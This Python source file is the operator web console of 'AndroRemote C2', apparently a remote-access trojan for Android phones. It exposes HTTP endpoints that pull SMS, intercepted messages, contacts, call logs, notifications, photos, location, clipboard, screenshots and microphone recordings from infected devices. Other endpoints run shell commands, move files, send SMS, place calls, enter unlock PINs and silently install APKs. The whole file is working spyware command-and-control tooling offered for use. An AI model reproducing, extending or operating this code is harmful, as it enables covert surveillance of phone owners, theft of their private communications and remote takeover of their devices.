#!/usr/bin/env python3
"""Operator web UI for AndroRemote C2.

A dependency-free HTTP server (stdlib only) that serves the single-page web
console from androremote/web/ and exposes:

  GET  /                     SPA shell
  GET  /static/...           assets (js/css/vendor)
  GET  /api/state            server + sessions snapshot
  GET  /api/events           SSE stream (session/result/log events)
  POST /api/op               structured operator ops (info, smsin, log, ...)
  POST /api/cmd              raw command pass-through (terminal)
  POST /api/session          activate / rename / forget
  POST /api/screen           capture screenshot (PNG b64)
  GET  /api/download?cid=&path=   fetch remote file as attachment
  POST /api/upload           push a file to the device
  GET  /api/cache            result-cache listing
  POST /api/cache/clear      purge cache

Runs alongside the C2 listener on its own port (default 8888, loopback only
unless --web-host says otherwise). Optional bearer token via --web-token.
"""

import base64
import json
import os
import re
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from queue import Empty
from urllib.parse import urlparse, parse_qs, unquote

from androremote import c2 as core
from androremote.events import BUS

WEB_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "web", "dist")
WEB_TOKEN = None
WEB_SERVER = None

MIME = {
    ".html": "text/html; charset=utf-8",
    ".js": "application/javascript; charset=utf-8",
    ".css": "text/css; charset=utf-8",
    ".svg": "image/svg+xml",
    ".png": "image/png",
    ".ico": "image/x-icon",
    ".woff2": "font/woff2",
    ".map": "application/json",
}

CID_LOCKS = {}
CID_LOCKS_GUARD = threading.Lock()


def cid_lock(cid):
    with CID_LOCKS_GUARD:
        if cid not in CID_LOCKS:
            CID_LOCKS[cid] = threading.Lock()
        return CID_LOCKS[cid]


# ─────────────────────────── command execution ─────────────────────────

def run_cmd(cid, cmd_str, timeout=None, use_cache=True, force_refresh=False):
    """Queue a command and wait for *its* result — like core.send_and_wait but
    without touching the rich console (safe to call from web threads).

    The result is matched by command text via the event bus, so a fast ack
    (e.g. FASTPOLL) queued by another path can't be mistaken for ours.
    Returns (ok, result_text); ok is None on timeout."""
    timeout = timeout or core.BEACON_TIMEOUT
    cmd_str = cmd_str.strip()
    if not cmd_str:
        return False, "ERR empty command"
    with core.LOCK:
        c = core.CLIENTS.get(cid)
        if not c:
            return False, "ERR no such session"
    op = cmd_str.split()[0].upper()
    want = cmd_str.upper()

    if use_cache and not force_refresh and op in core.CACHEABLE_CMDS:
        cached = core.CACHE.get(cid, cmd_str)
        if cached is not None:
            return True, cached

    with cid_lock(cid):
        sid, q = BUS.subscribe(types={"result"})   # subscribe BEFORE queueing
        try:
            core.queue(cid, cmd_str)
            t0 = time.time()
            while time.time() - t0 < timeout:
                try:
                    evt = q.get(timeout=0.3)
                except Empty:
                    continue
                if evt.get("cid") != cid or (evt.get("cmd") or "").strip().upper() != want:
                    continue
                # read the full result from client state (events truncate)
                with core.LOCK:
                    c = core.CLIENTS.get(cid)
                    res = c["result"] if c and c["result"] is not None else evt.get("result") or ""
                if op in core.CACHEABLE_CMDS and not res.startswith("ERR"):
                    core.CACHE.set(cid, cmd_str, res)
                return (not res.startswith("ERR")), res
            return None, f"ERR timeout after {int(timeout)}s — agent may be offline"
        finally:
            BUS.unsubscribe(sid)


# ───────────────────────────── parsers (agent text → JSON) ─────────────────────

def _strip_ok(raw):
    if not raw:
        return []
    lines = [ln.strip() for ln in raw.splitlines() if ln.strip()]
    if lines and lines[0].startswith("OK"):
        lines[0] = lines[0][3:].strip()
    return [ln for ln in lines if ln]


def parse_info(raw):
    if not raw or raw.startswith("ERR"):
        return None
    text = raw[2:].strip() if raw.startswith("OK") else raw.strip()
    f = {}
    for token in text.split():
        if "=" in token:
            k, v = token.split("=", 1)
            f[k.strip()] = v.strip()
    return f


def parse_perms(raw):
    out = []
    for ln in _strip_ok(raw):
        if "=" in ln:
            p, st = ln.split("=", 1)
        elif ": " in ln:
            p, st = ln.split(": ", 1)
        else:
            p, st = ln, "?"
        out.append({"perm": p.replace("android.permission.", ""), "granted": "grant" in st.lower()})
    return out


def parse_apps(raw):
    out = []
    for pkg in sorted(set(_strip_ok(raw))):
        system = pkg.startswith(("com.android.", "android", "com.google.android.", "com.qualcomm.", "com.sec."))
        out.append({"pkg": pkg, "system": system})
    return out


def parse_contacts(raw):
    out = []
    for ln in _strip_ok(raw):
        name, _, num = ln.partition(" | ")
        out.append({"name": name.strip(), "number": num.strip()})
    return out


def _split_date(parts, start):
    """Split a 'sender <date> body...' line. The agent prints java.util.Date
    (6 tokens: 'Fri Sep 05 10:12:44 GMT 2026'); ISO 'YYYY-MM-DD HH:MM:SS' is
    also accepted. Returns (date_str, body_parts)."""
    rest = parts[start:]
    if len(rest) >= 2 and re.match(r"^\d{4}-\d{2}-\d{2}$", rest[0]) and re.match(r"^\d{2}:\d{2}:\d{2}$", rest[1]):
        return rest[0] + " " + rest[1], rest[2:]
    if len(rest) >= 6:
        return " ".join(rest[:6]), rest[6:]
    if len(rest) >= 1:
        return rest[0], rest[1:]
    return "-", []


def parse_smsin(raw):
    out = []
    for ln in _strip_ok(raw):
        parts = ln.split(" ")
        if len(parts) >= 2:
            date, body = _split_date(parts, 1)
            out.append({"from": parts[0], "date": date, "body": " ".join(body)})
        else:
            out.append({"from": "?", "date": "-", "body": ln})
    return out


def parse_calllog(raw):
    out = []
    for ln in _strip_ok(raw):
        parts = ln.split(" ")
        if len(parts) >= 2:
            rtype, num = parts[0], parts[1]
            date, rest = _split_date(parts, 2)
            dur = rest[0].rstrip("s") if rest else "-"
        else:
            rtype, num, date, dur = "-", ln, "-", "-"
        out.append({"type": rtype, "number": num, "date": date, "duration": dur})
    return out


def parse_notifs(raw):
    out = []
    for ln in _strip_ok(raw):
        parts = ln.split(" ", 2)
        if len(parts) >= 3 and ":" in parts[1]:
            ts = f"{parts[0]} {parts[1]}"
            rest = parts[2]
        else:
            ts = parts[0] if parts else "-"
            rest = " ".join(parts[1:]) if len(parts) > 1 else ln
        pkg, _, content = rest.partition(" ")
        out.append({"time": ts, "pkg": pkg, "content": content})
    return out


def parse_photos(raw):
    out = []
    for ln in _strip_ok(raw):
        parts = ln.rsplit(" ", 6)
        if len(parts) == 2:
            path, date = parts
        elif len(parts) > 1:
            path, date = parts[0], " ".join(parts[1:])
        else:
            path, date = ln, "-"
        out.append({"path": path, "date": date})
    return out


def parse_ls(raw):
    out = []
    for item in _strip_ok(raw):
        out.append({"name": item, "dir": item.endswith("/")})
    return out


def parse_drives(raw):
    return [{"path": p} for p in _strip_ok(raw)]


def parse_sms_record(content, fname):
    ts = "-"
    m = re.search(r"sms_(\d{4})(\d{2})(\d{2})_(\d{2})(\d{2})(\d{2})", fname)
    if m:
        ts = f"{m.group(1)}-{m.group(2)}-{m.group(3)} {m.group(4)}:{m.group(5)}:{m.group(6)}"
    sender, body = "?", ""
    if content and not content.startswith("ERR"):
        clean = content[3:].strip() if content.startswith("OK") else content.strip()
        lines = clean.splitlines()
        for i, ln in enumerate(lines):
            if ln.startswith("from="):
                sender = ln[5:].strip()
                body = "\n".join(lines[i + 1:]).strip()
                break
        if not body and clean:
            body = clean
    return {"time": ts, "from": sender, "body": body, "file": fname}


def fetch_sms_logs(cid, force_refresh=False):
    """Intercepted SMS list — mirrors core.cmd_log, shares its CACHE keys."""
    cached = core.CACHE.get(cid, "PARSED_SMS_LOGS")
    if cached is not None and not force_refresh:
        return cached
    ok, raw = run_cmd(cid, "LOG", use_cache=not force_refresh, force_refresh=force_refresh)
    if not ok:
        return None
    if "no logs" in raw.lower():
        return []
    files = [ln for ln in _strip_ok(raw) if ln != "no logs"]
    if not files:
        return []
    records = []
    for f in sorted(files, reverse=True):
        content = core.CACHE.get(cid, f"SMSLOG_{f}")
        if content is None or force_refresh:
            ok_r, content = run_cmd(cid, f"SMSLOG {f}", use_cache=False)
            if ok_r:
                core.CACHE.set(cid, f"SMSLOG_{f}", content)
        records.append(parse_sms_record(content, f))
    core.CACHE.set(cid, "PARSED_SMS_LOGS", records)
    return records


# ───────────────────────────── operator ops ─────────────────────────

def _num(args, key, default):
    v = args.get(key, default)
    try:
        return int(v)
    except (TypeError, ValueError):
        return default


def op_screen(cid, args):
    ok, res = run_cmd(cid, "SCREENB64", timeout=45, use_cache=False)
    if not ok or not res:
        return {"error": res or "capture failed"}
    parts = res.split(" ", 2)
    if parts[0] != "OK" or len(parts) < 3:
        return {"error": res}
    return {"png": parts[2], "bytes": int(parts[1]) if parts[1].isdigit() else 0}


def op_rec(cid, args):
    secs = _num(args, "secs", 10)
    ok, res = run_cmd(cid, f"RECORD {secs}", timeout=max(60, secs + 30), use_cache=False)
    if not ok:
        return {"error": res or "record failed"}
    parts = res.split(" ")
    if parts[0] != "OK" or len(parts) < 4:
        return {"error": res}
    remote = parts[2]
    ok2, res2 = run_cmd(cid, "GETB64 " + core.b64s(remote), use_cache=False)
    if not ok2 or not res2:
        return {"error": res2 or "download failed"}
    p2 = res2.split(" ", 2)
    if p2[0] != "OK" or len(p2) < 3:
        return {"error": res2}
    return {"wav": p2[2], "path": remote, "bytes": int(p2[1]) if p2[1].isdigit() else 0}


UPDATE_REMOTE = "/storage/emulated/0/Android/data/com.ohmpi.androremote/files/update.apk"


def op_update(cid, args):
    """Push an APK to the agent's update path and trigger a silent install."""
    data_b64 = str(args.get("data_b64", ""))
    if not data_b64:
        return {"error": "data_b64 required"}
    try:
        data = base64.b64decode(data_b64)
    except Exception:
        return {"error": "invalid base64"}
    if len(data) > 32 * 1024 * 1024:
        return {"error": "APK > 32MB"}
    payload = "PUTB64 " + core.b64s(UPDATE_REMOTE) + " " + base64.b64encode(data).decode()
    ok, res = run_cmd(cid, payload, use_cache=False)
    if not ok:
        return {"error": res or "upload failed"}
    ok2, res2 = run_cmd(cid, f"INSTALL {UPDATE_REMOTE}", use_cache=False)
    return {"uploaded": len(data), "text": res2 or res, "ok": bool(ok2)}


def handle_op(op, cid, args, force_refresh):
    """Dispatch a structured operator op. Returns JSON-able dict."""
    op = str(op).strip().lower()
    fr = force_refresh

    if op == "screen":
        return op_screen(cid, args)
    if op == "rec":
        return op_rec(cid, args)
    if op == "update":
        return op_update(cid, args)

    simple = {
        "ping": ("PING", None, "text"),
        "id": ("ID", None, "text"),
        "loc": ("LOC", None, "text"),
        "clipget": ("CLIPGET", None, "text"),
        "installstatus": ("INSTALLSTATUS", None, "text"),
        "info": ("INFO", parse_info, "info"),
        "perms": ("PERMS", parse_perms, "rows"),
        "apps": ("APPS", parse_apps, "rows"),
        "contacts": (f"CONTACTS {_num(args, 'n', 50)}", parse_contacts, "rows"),
        "smsin": (f"SMSIN {_num(args, 'n', 20)}", parse_smsin, "rows"),
        "calllog": (f"CALLLOG {_num(args, 'n', 25)}", parse_calllog, "rows"),
        "notifs": (f"NOTIFS {_num(args, 'n', 25)}", parse_notifs, "rows"),
        "photos": (f"PHOTOS {_num(args, 'n', 30)}", parse_photos, "rows"),
        "drives": ("DRIVES", parse_drives, "rows"),
    }
    if op == "log":
        records = fetch_sms_logs(cid, force_refresh=fr)
        if records is None:
            return {"error": "failed to retrieve SMS logs"}
        return {"rows": records}
    if op in simple:
        cmd, parser, kind = simple[op]
        ok, res = run_cmd(cid, cmd, force_refresh=fr)
        if not ok or res is None:
            return {"error": res or "command failed"}
        if kind == "text":
            clean = res[3:].strip() if res.startswith("OK") else res
            return {"text": clean}
        if parser is parse_info:
            data = parser(res)
            return {"info": data} if data is not None else {"error": res}
        return {"rows": parser(res)}

    # device control ops → raw result
    control = {
        "startapp": "STARTAPP " + str(args.get("pkg", "")),
        "sms": "SMS " + str(args.get("number", "")) + " " + str(args.get("text", "")),
        "call": "CALL " + str(args.get("number", "")),
        "tap": f"TAP {_num(args, 'x', 0)} {_num(args, 'y', 0)}",
        "swipe": f"SWIPE {_num(args, 'x1', 0)} {_num(args, 'y1', 0)} {_num(args, 'x2', 0)} {_num(args, 'y2', 0)} {_num(args, 'ms', 300)}",
        "settext": "SETTEXT " + str(args.get("text", "")),
        "gaction": "GACTION " + str(args.get("action", "")),
        "wake": "WAKE " + str(args.get("secs", "")),
        "sleep": "SLEEP",
        "unlock": "UNLOCK " + str(args.get("pin", "")),
        "vol": "VOL " + str(args.get("level", "")),
        "clipset": "CLIPSET " + str(args.get("text", "")),
        "torch": "TORCH " + str(args.get("state", "")),
        "vibrate": "VIBRATE " + str(args.get("ms", 500)),
        "fastpoll": "FASTPOLL " + str(args.get("secs", 120)),
    }
    if op == "shell":
        ok, res = run_cmd(cid, "SHELL " + str(args.get("cmd", "")), use_cache=False)
        return {"text": res or ""}
    if op == "vol":
        lvl = args.get("level")
        ok, res = run_cmd(cid, ("VOL " + str(lvl)) if lvl else "VOL", use_cache=False)
        return {"text": res or "", "ok": bool(ok)}
    if op == "ls":
        path = args.get("path") or "/sdcard"
        ok, res = run_cmd(cid, f"LS {path}")
        if not ok:
            return {"error": res or "ls failed"}
        return {"rows": parse_ls(res), "path": path}
    if op in control:
        ok, res = run_cmd(cid, control[op], use_cache=False)
        return {"text": res or "", "ok": bool(ok)}
    if op == "ping_all":
        return {"text": "see terminal"}
    return {"error": f"unknown op: {op}"}


# operator command names for terminal translation
OP_ALIASES = {
    "ping": "PING", "id": "ID", "info": "INFO", "perms": "PERMS", "apps": "APPS",
    "loc": "LOC", "clipget": "CLIPGET", "sleep": "SLEEP", "installstatus": "INSTALLSTATUS",
}


def translate_terminal_cmd(text):
    """Map an operator-style command to the raw agent wire command."""
    text = text.strip().lstrip("/")
    if not text:
        return None, "empty command"
    parts = text.split()
    op = parts[0].lower()
    rest = parts[1:]
    if op in OP_ALIASES:
        return OP_ALIASES[op], None
    mapping = {
        "shell": "SHELL", "ls": "LS", "startapp": "STARTAPP", "sms": "SMS",
        "call": "CALL", "tap": "TAP", "swipe": "SWIPE", "settext": "SETTEXT",
        "gaction": "GACTION", "wake": "WAKE", "unlock": "UNLOCK", "vol": "VOL",
        "clipset": "CLIPSET", "torch": "TORCH", "vibrate": "VIBRATE",
        "fastpoll": "FASTPOLL", "smslog": "SMSLOG", "contacts": "CONTACTS",
        "smsin": "SMSIN", "calllog": "CALLLOG", "notifs": "NOTIFS", "photos": "PHOTOS",
    }
    if op in mapping:
        base = mapping[op]
        defaults = {"ls": "/sdcard", "contacts": "50", "smsin": "20", "calllog": "25", "notifs": "25", "photos": "30"}
        if not rest and op in defaults:
            return f"{base} {defaults[op]}", None
        return (base + (" " + " ".join(rest) if rest else "")), None
    if op in ("log", "smslog"):
        return None, "use the SMS data tab or /api/op for intercepted SMS"
    if op in ("screen", "rec", "get", "put", "update", "build", "cache"):
        return None, f"'{op}' is handled by dedicated UI controls"
    # pass through as raw agent command
    return text, None


# ───────────────────────────── state snapshot ─────────────────────────

def snapshot():
    now = time.time()
    with core.LOCK:
        sessions = []
        for cid, c in core.CLIENTS.items():
            age = now - c["last_seen"]
            if age <= 25:
                status = "online"
            elif age <= 90:
                status = "idle"
            else:
                status = "offline"
            sessions.append({
                "cid": cid,
                "tag": core.alias_tag(cid),
                "model": c.get("model") or "unknown",
                "status": status,
                "last_seen": c["last_seen"],
                "last_seen_age": int(age),
                "pending": len(c["pending"]),
                "enc": bool(c.get("enc")),
                "seq": c["seq"],
                "has_result": bool(c["result"]),
                "last_cmd": c.get("last_cmd"),
            })
        active = core.ACTIVE["id"]
    sessions.sort(key=lambda s: -s["last_seen"])

    plugins = []
    if core.PLUGIN_MANAGER:
        for name, p in core.PLUGIN_MANAGER.plugins.items():
            plugins.append({"name": name, "version": p.version, "description": p.description, "enabled": p.enabled})

    up = int(now - core.STARTED)
    tunnel_cfg = core.tunnel_named_cfg()
    return {
        "server": {
            "uptime": up,
            "port": core.ARGS.port if core.ARGS else core.PORT_DEFAULT,
            "tls": bool(core.TLS),
            "enc": core.PSK is not None,
            "key_fp": core.key_fp() if core.PSK else None,
            "tunnel_url": core.TUNNEL.get("url"),
            "tunnel_mode": core.TUNNEL.get("mode") or "off",
            "tunnel_host": tunnel_cfg.get("hostname") if tunnel_cfg else None,
            "plugins": plugins,
            "web_port": WEB_SERVER.server_address[1] if WEB_SERVER else None,
        },
        "active": active,
        "sessions": sessions,
    }


# ───────────────────────────── HTTP handler ─────────────────────────

class WebHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    # helpers ------------------------------------------------------------

    def _authorized(self):
        if not WEB_TOKEN:
            return True
        auth = self.headers.get("Authorization", "")
        if auth == f"Bearer {WEB_TOKEN}":
            return True
        tok = parse_qs(urlparse(self.path).query).get("token", [""])[0]
        return tok == WEB_TOKEN

    def _deny(self):
        body = b"unauthorized"
        self.send_response(401)
        self.send_header("WWW-Authenticate", "Bearer")
        self._common_headers()
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _common_headers(self):
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Referrer-Policy", "no-referrer")

    def _json(self, obj, code=200):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self._common_headers()
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_body(self):
        n = int(self.headers.get("Content-Length") or 0)
        if n <= 0 or n > 64 * 1024 * 1024:
            return {}
        try:
            return json.loads(self.rfile.read(n).decode("utf-8"))
        except (ValueError, UnicodeDecodeError):
            return {}

    def _serve_file(self, fpath):
        try:
            with open(fpath, "rb") as f:
                data = f.read()
        except OSError:
            return self._json({"error": "not found"}, 404)
        ext = os.path.splitext(fpath)[1].lower()
        self.send_response(200)
        self._common_headers()
        self.send_header("Content-Type", MIME.get(ext, "application/octet-stream"))
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    # routes -------------------------------------------------------------

    def do_GET(self):
        u = urlparse(self.path)
        path = u.path

        if not self._authorized():
            return self._deny()

        if path in ("/", "/index.html"):
            return self._serve_file(os.path.join(WEB_DIR, "index.html"))
        # static assets from the built SPA (dist/)
        rel = os.path.normpath(unquote(path.lstrip("/")))
        if rel and not rel.startswith(".."):
            fpath = os.path.join(WEB_DIR, rel)
            if os.path.isfile(fpath):
                return self._serve_file(fpath)

        if path == "/api/state":
            return self._json(snapshot())

        if path == "/api/cache":
            items = core.CACHE.items()
            for it in items:
                it["tag"] = core.alias_tag(it.pop("cid"))
            return self._json({"items": items})

        if path == "/api/events":
            return self._sse()

        if path == "/api/download":
            qs = parse_qs(u.query)
            cid = qs.get("cid", [""])[0]
            rpath = qs.get("path", [""])[0]
            name = qs.get("name", [""])[0] or os.path.basename(rpath) or "file.bin"
            if not cid or not rpath:
                return self._json({"error": "cid and path required"}, 400)
            ok, res = run_cmd(cid, "GETB64 " + core.b64s(rpath), use_cache=False)
            if not ok:
                return self._json({"error": res or "download failed"}, 502)
            parts = res.split(" ", 2)
            if parts[0] != "OK" or len(parts) < 3:
                return self._json({"error": res}, 502)
            data = base64.b64decode(parts[2] + "=" * (-len(parts[2]) % 4))
            self.send_response(200)
            self._common_headers()
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Disposition", f"attachment; filename=\"{name}\"")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            core.ev("✓", f"web download: {rpath} ({len(data):,} B)", "green")
            return

        return self._json({"error": "not found"}, 404)

    def do_POST(self):
        u = urlparse(self.path)
        path = u.path

        if not self._authorized():
            return self._deny()

        body = self._read_body()

        if path == "/api/op":
            op = str(body.get("op", ""))
            cid = body.get("cid") or core.ACTIVE["id"]
            if not cid:
                return self._json({"error": "no session selected"}, 400)
            with core.LOCK:
                known = cid in core.CLIENTS
            if not known:
                return self._json({"error": "unknown session"}, 404)
            try:
                result = handle_op(op, cid, body.get("args") or {}, bool(body.get("refresh")))
            except Exception as e:
                result = {"error": f"{type(e).__name__}: {e}"}
            return self._json(result)

        if path == "/api/cmd":
            cid = body.get("cid") or core.ACTIVE["id"]
            if not cid:
                return self._json({"error": "no session selected"}, 400)
            wire, error = translate_terminal_cmd(str(body.get("cmd", "")))
            if error:
                return self._json({"error": error}, 400)
            ok, res = run_cmd(cid, wire, use_cache=False)
            return self._json({"cmd": wire, "ok": ok, "result": res})

        if path == "/api/session":
            action = body.get("action")
            cid = body.get("cid")
            with core.LOCK:
                known = cid in core.CLIENTS if cid else False
            if action == "activate":
                if not known:
                    return self._json({"error": "unknown session"}, 404)
                core.ACTIVE["id"] = cid
                core.queue(cid, "FASTPOLL 45")
                BUS.publish_json("session", event="active", cid=cid, tag=core.alias_tag(cid))
                core.ev("●", f"web: active session → {core.alias_tag(cid)}", "green")
                return self._json({"ok": True})
            if action == "rename":
                if not known:
                    return self._json({"error": "unknown session"}, 404)
                alias = str(body.get("alias", "")).strip()
                if not alias:
                    return self._json({"error": "alias required"}, 400)
                core.ALIASES[cid] = alias
                core.save_aliases()
                BUS.publish_json("session", event="rename", cid=cid, tag=alias)
                return self._json({"ok": True})
            if action == "forget":
                if not known:
                    return self._json({"error": "unknown session"}, 404)
                with core.LOCK:
                    core.CLIENTS.pop(cid, None)
                core.ALIASES.pop(cid, None)
                core.save_aliases()
                if core.ACTIVE["id"] == cid:
                    core.ACTIVE["id"] = None
                BUS.publish_json("session", event="forget", cid=cid)
                return self._json({"ok": True})
            return self._json({"error": "unknown action"}, 400)

        if path == "/api/upload":
            cid = body.get("cid") or core.ACTIVE["id"]
            rpath = str(body.get("path", ""))
            data_b64 = str(body.get("data_b64", ""))
            if not cid or not rpath or not data_b64:
                return self._json({"error": "cid, path, data_b64 required"}, 400)
            try:
                data = base64.b64decode(data_b64)
            except Exception:
                return self._json({"error": "invalid base64"}, 400)
            if len(data) > 32 * 1024 * 1024:
                return self._json({"error": "file > 32MB"}, 400)
            payload = "PUTB64 " + core.b64s(rpath) + " " + base64.b64encode(data).decode()
            ok, res = run_cmd(cid, payload, use_cache=False)
            return self._json({"ok": bool(ok), "result": res, "bytes": len(data)})

        if path == "/api/cache/clear":
            cid = body.get("cid") or None
            if cid:
                with core.LOCK:
                    known = cid in core.CLIENTS
                if not known:
                    return self._json({"error": "unknown session"}, 404)
            n = core.CACHE.invalidate(cid)
            return self._json({"cleared": n})

        return self._json({"error": "not found"}, 404)

    # SSE ------------------------------------------------------------------

    def _sse(self):
        self.send_response(200)
        self._common_headers()
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Connection", "keep-alive")
        self.send_header("X-Accel-Buffering", "no")
        self.end_headers()
        sub_id, q = BUS.subscribe()
        try:
            self.wfile.write(b"event: hello\ndata: {}\n\n")
            self.wfile.flush()
            while True:
                try:
                    evt = q.get(timeout=15)
                except Empty:
                    self.wfile.write(b": keepalive\n\n")
                    self.wfile.flush()
                    continue
                payload = json.dumps(evt, separators=(",", ":"))
                self.wfile.write(f"event: {evt['type']}\ndata: {payload}\n\n".encode())
                self.wfile.flush()
        except (BrokenPipeError, ConnectionResetError, OSError):
            pass
        finally:
            BUS.unsubscribe(sub_id)


def start_web(host="127.0.0.1", port=8888, token=None):
    global WEB_SERVER, WEB_TOKEN
    WEB_TOKEN = token
    WEB_SERVER = ThreadingHTTPServer((host, port), WebHandler)
    WEB_SERVER.daemon_threads = True
    threading.Thread(target=WEB_SERVER.serve_forever, daemon=True, name="webui").start()
    url = f"http{'s' if core.TLS else ''}://{host}:{port}"
    if token:
        url += f"  (token required)"
    core.ev("*", f"web ui live → [bold cyan]{url}[/bold cyan]", "cyan")
    return WEB_SERVER
